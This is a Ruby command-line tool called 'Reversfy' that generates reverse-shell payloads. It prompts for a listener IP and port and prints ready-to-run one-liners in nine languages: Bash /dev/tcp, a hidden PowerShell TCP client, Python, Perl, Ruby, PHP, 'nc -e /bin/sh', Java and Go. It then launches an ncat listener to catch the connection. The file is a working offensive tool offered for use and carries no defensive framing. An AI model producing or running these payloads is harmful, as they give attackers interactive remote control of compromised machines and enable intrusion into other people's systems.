require 'ipaddress'
require 'colorize'
require 'artii'



# Check if a given IP address is valid
def is_valid_ip?(ip)
  IPAddress.valid?(ip)
end

# Check if a given port is valid
def is_valid_port?(port)
  port.to_i.between?(1, 65535)
end

# Banner art
a = Artii::Base.new(font: 'big')
puts a.asciify('Reversfy').colorize(:green)
print " By @Hab1b0x                               \n\n".colorize(:green)

print "   Usage:                                  \n".colorize(:green)
print "   - Enter the IP address of the listener  \n".colorize(:green)
print "   - Enter the port number of the listener \n".colorize(:green)
print "   - Select the shell                      \n\n".colorize(:green)

# Main loop
while true
  # Loop to prompt user for valid IP address
  while true
    begin
      print "Enter the IP address: ".colorize(:green)
      ip = STDIN.gets.strip
      if !is_valid_ip?(ip)
        raise ArgumentError.new("Invalid IP address")
      end
    rescue => e
      puts "Error: #{e}, please enter a valid IP address"
    end
    break if is_valid_ip?(ip)
  end

  # Loop to prompt user for valid port
  while true
    begin
      print "Enter the port: ".colorize(:green)
      port = STDIN.gets.strip
      if !is_valid_port?(port)
        raise ArgumentError.new("Invalid port")
      end
    rescue => e
      puts "Error: #{e}, please enter a valid port"
    end
    break if is_valid_port?(port)
  end

  # Prompt user to select shell
  puts "Select the shell: ".colorize(:green)
  puts "1. Bash".colorize(:green)
  puts "2. PowerShell".colorize(:green)
  puts "3. Python".colorize(:green)
  puts "4. Perl".colorize(:green)
  puts "5. Ruby".colorize(:green)
  puts "6. PHP".colorize(:green)
  puts "7. Netcat".colorize(:green)
  puts "8. Java".colorize(:green)
  puts "9. Golang".colorize(:green)

  
  shell = gets.chomp
    case shell
    when "1"
      cmd = "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1"
      puts "Command: #{cmd}\n"

    when "2"
      cmd = "powershell.exe -nop -w hidden -c $client = New-Object System.Net.Sockets.TCPClient('#{ip}',#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      puts "Command: #{cmd}\n"

    when "3"
      cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
      puts "Command: #{cmd}\n"

    when "4"
      cmd = "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
      puts "Command: #{cmd}\n"

    when "5"
      cmd = "ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
      puts "Command: #{cmd}\n"

    when "6"
      cmd = "php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      puts "Command: #{cmd}\n"

    when "7"
      cmd = "nc -e /bin/sh #{ip} #{port}"
      puts "Command: #{cmd}\n"

    when "8"
      cmd = "r = Runtime.getRuntime()
      p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/#{ip}/#{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
      p.waitFor()"
      puts "Command: #{cmd}\n"

    when "9"
      cmd = "package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"#{ip}:#{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}"
      puts "Command: #{cmd}\n"
    
    else
      puts "Invalid option"
    end

  # Start listener
  begin
    puts "Starting listener on #{ip}:#{port} with ncat \n".colorize(:yellow)
    ncat_listener = "ncat -vlp #{port}"
    system(ncat_listener)
  rescue
    puts "Error: #{ncat_listener}"
  end

  # Ask user if they want to continue
  puts "Do you want to continue? (y/n)"
  choice = STDIN.gets.chomp
  break if choice.downcase == "n"
end
